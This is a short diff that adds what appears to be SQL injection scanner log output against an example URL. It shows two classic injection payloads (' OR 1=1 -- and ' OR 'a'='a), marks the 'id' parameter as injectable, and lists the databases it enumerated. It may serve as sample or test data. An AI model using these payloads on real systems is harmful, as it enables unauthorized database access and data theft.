@@ -1,0 +1,11 @@
+Testing https://vuln.example.com/item?id=1...
+payload: ' OR 1=1 --
+payload: ' OR 'a'='a
+Scanning parameter: id
+Parameter: id (GET) is potentially injectable
+[info] available databases:
+[information_schema]
+mysql
+webapp_db
+app_users
+Target does not respond to time-based blind SQLi
